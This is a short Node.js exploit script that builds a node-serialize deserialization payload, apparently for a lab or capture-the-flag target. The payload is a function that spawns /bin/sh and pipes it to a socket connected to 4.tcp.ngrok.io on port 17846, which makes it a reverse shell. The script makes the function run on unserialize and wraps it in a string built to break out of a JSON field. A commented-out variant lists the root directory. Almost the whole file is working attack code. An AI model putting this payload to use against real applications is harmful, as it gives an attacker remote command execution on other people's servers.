let serialize = require('node-serialize');

function getPayloadWithoutBracket() {
	let y ={}
	/*
	y = {
		rce : function(){
			require('child_process').exec('ls /', function(error,
			stdout, stderr) { console.log(stdout) });
		},
	}
	*/

	y = {
		rce: function(){
			var net = require("net"),
					cp = require("child_process"),
					sh = cp.spawn("/bin/sh", []);
			var client = new net.Socket();
			client.connect(17846, "4.tcp.ngrok.io", function(){
					client.pipe(sh.stdin);
					sh.stdout.pipe(client);
					sh.stderr.pipe(client);
			});
			return /a/; // Prevents the Node.js application form crashing
		},
	}
	/*
{"rce":"_$$ND_FUNC$$_function(){\n\t\t\tvar net = require(\"net\"),\n\t\t\t\t\tcp = require(\"child_process\"),\n\t\t\t\t\tsh = cp.spawn(\"/bin/sh\", []);\n\t\t\tvar client = new net.Socket();\n\t\t\tclient.connect(17846, \"4.tcp.ngrok.io\", function(){\n\t\t\t\t\tclient.pipe(sh.stdin);\n\t\t\t\t\tsh.stdout.pipe(client);\n\t\t\t\t\tsh.stderr.pipe(client);\n\t\t\t});\n\t\t\treturn /a/; // Prevents the Node.js application form crashing\n\t\t}()"}
	*/
	
	let serialized_y = serialize.serialize(y);
	// console.log("Serialized: \n" + serialized_y);
	return serialized_y
}

payload = getPayloadWithoutBracket().toString()
payload = payload.slice(0,-2) + '()' + payload.slice(-2)
payload = `", ${payload.slice(1,-1)}, "c":"`
console.log(payload)

var info = `{"a":"a", "b": "${payload}"}`
console.log(info)

// serialize.unserialize(info)
